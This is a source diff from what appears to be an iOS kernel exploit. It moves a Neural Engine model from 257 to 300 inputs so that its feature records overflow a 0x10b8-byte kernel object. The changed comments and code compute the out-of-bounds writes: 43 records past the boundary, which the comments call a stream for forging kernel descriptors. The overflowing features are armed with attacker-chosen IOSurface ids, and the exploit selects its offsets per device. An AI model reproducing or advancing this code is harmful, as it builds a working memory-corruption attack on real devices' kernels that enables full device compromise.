@@ -68,15 +68,18 @@
    tunes both without a rebuild: prefill = live portkind count placed
    fire-1 hop; burst = the fresh-small census load count (0 for the pure
    conversion round). */
-/* v13 (T8150 257-in artifact): model selection + input construction go
-   RUNTIME off LabOff()->ane_table_size — T8150 (24A435, 0x10b8) loads
-   XVRC27_257in_1out_addchain and builds 257 features; EVERY other row
-   (A14/23F77 0x820 included) keeps the 254 path bit-for-bit. Record-area
-   law on T8150: 0x10b8 obj, records +0x90..+0x1080 = 255 in-bounds records
-   (0x10a0 cleared, trailer at +0x1080) — 257-in + 1-out = 258 records =
-   3 OOB record writes at indices 255/256/257 (obj+0x1080/+0x1090/+0x10a0:
-   the out-summary trailer band, smashed past the 255-record array). */
-#define P073_BUILD @"p073-second-table-v13-t8150-257in"
+/* v13b (300-in forging stream): the door map precision law — with records
+   at obj+0x90+n*0x10 and the 0x10b8 object, 257-in+1-out = 258 total = only
+   1 record crossing the trailer band (enough for a first round); the desc
+   door needs the record stream to run MANY records into the neighbor
+   element (16B kdescs on xnu-13432 = 1:1 with 16B records). 300-in + 1-out
+   = 301 total = 258 in-through-object + 43 records past the 0x10b8
+   boundary = the full forging stream. The fill's in-count = the compiled
+   program's input count — NOT capped at 257 by anything derived. The
+   selection stays RUNTIME off LabOff()->ane_table_size (T8150 0x10b8 only,
+   300-in preferred when present, 257-in fallback). Every other row
+   (A14/23F77 0x820 included) keeps the 254 path bit-for-bit. */
+#define P073_BUILD @"p073-second-table-v13b-t8150-300in"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class).
    v12: the class is RUNTIME — T8150's record law = 0x10b8 (notes 251/265,
@@ -104,6 +107,11 @@ static uint32_t g_p073_inpcbN;
    255 records, so 254-in is fully in-bounds and 257-in is the OOB shape. */
 #define P073_INPUTS_257   257u
 #define P073_ADDCHAIN_257 @"XVRC27_257in_1out_addchain"
+/* v13b: T8150 forging stream — 300 in / 1 out "y" addchain; 301 records =
+   43 past the 0x10b8 boundary. Selected when the bundle carries it,
+   257-in is the fallback. */
+#define P073_INPUTS_300   300u
+#define P073_ADDCHAIN_300 @"XVRC27_300in_1out_addchain"
 #define P073_INPUTS_MAX   1024u  /* honest model-description cross-check cap */
 #define P073_HEADSTART_US 0u   /* v9: 0ms headstart (265 MAF table - landing=deterministic record 192 at off 0) */
 #define P073_254_RETRY    3u     /* v3: bounded fill re-fire attempts (v2's 8ms -1
@@ -704,19 +712,29 @@ static NSURL *p073_model_url(NSString *name) {
 
     /* ---- models ---- */
     /* v13: runtime SKU law — ONLY the 0x10b8 record-area row (T8150 24A435)
-       switches the artifact to the 257-in addchain (T8150 needs in-count 257:
-       255-cap record area + 1 out = 258 records = 3 OOB record writes; 257-in
-       = 2 OOB in-records per the confirmed round). A14/23F77 (0x820) and
-       every other row keep P073_ADDCHAIN/254 EXACTLY as before. T8150_other
-       has ane_table_size 0 -> 254 path (safe). */
+       switches the artifact to the big-in addchains. v13b: 300-in preferred
+       (301 total records = 43 past the 0x10b8 boundary = the forging stream),
+       257-in fallback when the 300 resource is absent from the bundle.
+       A14/23F77 (0x820) and every other row keep P073_ADDCHAIN/254 EXACTLY as
+       before. T8150_other has ane_table_size 0 -> 254 path (safe). */
     uint32_t nIn = 0, oobFirst = 0;
-    BOOL t8150In257 = NO;
+    BOOL t8150InBig = NO;
     const LabOffTab *offMdl = LabOff();
     if (offMdl && offMdl->ane_table_size == 0x10b8u) {
-        t8150In257 = YES;
+        t8150InBig = YES;
     }
-    NSString *modelSel = t8150In257 ? P073_ADDCHAIN_257 : P073_ADDCHAIN;
-    uint32_t nInExpect = t8150In257 ? P073_INPUTS_257 : P073_INPUTS;
+    NSString *modelSel = P073_ADDCHAIN;   /* A14/23F77 default — unchanged */
+    uint32_t nInExpect = P073_INPUTS;
+    if (t8150InBig) {
+        if (p073_model_url(P073_ADDCHAIN_300)) {
+            modelSel = P073_ADDCHAIN_300;
+            nInExpect = P073_INPUTS_300;
+        } else {
+            p073_log(@"[v13b] 300-in resource ABSENT from the bundle — 257-in fallback");
+            modelSel = P073_ADDCHAIN_257;
+            nInExpect = P073_INPUTS_257;
+        }
+    }
     NSURL *url254 = p073_model_url(modelSel);
     NSURL *urlSmall = p073_model_url(P073_SMALL);
     if (!url254 || !urlSmall) {
@@ -756,7 +774,7 @@ static NSURL *p073_model_url(NSString *name) {
        the artifact, not a literal). */
     nIn = nInExpect;
     oobFirst = P073_OOB_FIRST;   /* 192 on A14/23F77 — unchanged */
-    if (t8150In257) {
+    if (t8150InBig) {
         oobFirst = offMdl->ane_table_entries ? offMdl->ane_table_entries : 255u;
     }
     {
@@ -767,9 +785,16 @@ static NSURL *p073_model_url(NSString *name) {
             nIn = (uint32_t)descIn;
         }
     }
-    p073_log(@"[v13] fire law: in-count=%u oobFirst=%u (T8150 %d) — 257-in + 1-out = 258 records "
-             @"= 3 OOB record writes vs the 255-record area (T8150 only)",
-             nIn, oobFirst, t8150In257 ? 1 : 0);
+    /* v13b: the OOB math in numbers — 257-in+1-out = 258 total = 3 OOB
+       record writes (trailer band); 300-in+1-out = 301 total = 43 records
+       past the 0x10b8 object end (indices 258..300; index 258 straddles
+       +0x10b0..0x10c0, 259..300 fully outside) = the kdesc forging stream.
+       A14: total 255 vs ITS OWN 0x820 law — the 258-boundary figure reads 0. */
+    uint32_t totalRecs = nIn + 1u;
+    uint32_t pastBoundary = (t8150InBig && totalRecs > 258u) ? totalRecs - 258u : 0u;
+    p073_log(@"[v13b] fire law: %@ in-count=%u oobFirst=%u (T8150 %d) — "
+             @"total records %u, past the 0x10b8 boundary %u (0 = non-T8150 law unchanged)",
+             modelSel, nIn, oobFirst, t8150InBig ? 1 : 0, totalRecs, pastBoundary);
 
     /* ---- features: in-bounds i+1; OOB (>= first OOB record index) armed with OUR surface ids ---- */
     NSMutableDictionary *features = [NSMutableDictionary dictionary];
@@ -798,9 +823,10 @@ static NSURL *p073_model_url(NSString *name) {
         if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
         NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
     }
-    /* v13 log is nIn/oobFirst-true (A14: 254/192, T8150: 257/255). The
-       expected-y figure is the pure in-bounds arming y = sum(1..in-count);
-       with OOB arming on, y carries IOSurface sids instead (honest). */
+    /* v13b log is nIn/oobFirst-true (A14: 254/192, T8150: 300/255 or 257/255
+       fallback). The expected-y figure is the pure in-bounds arming
+       y = sum(1..in-count) (300-in -> 45150, 257-in -> 33153); with OOB
+       arming on, y carries IOSurface sids instead (honest). */
     p073_log(@"[+] features armed: in-count=%u, OOB-feature arming from x_%03u "
              @"(D1 consume test, only when nSurf>0; else i+1 to x_%03u) — "
              @"expected y = %u (sum 1..%u)",
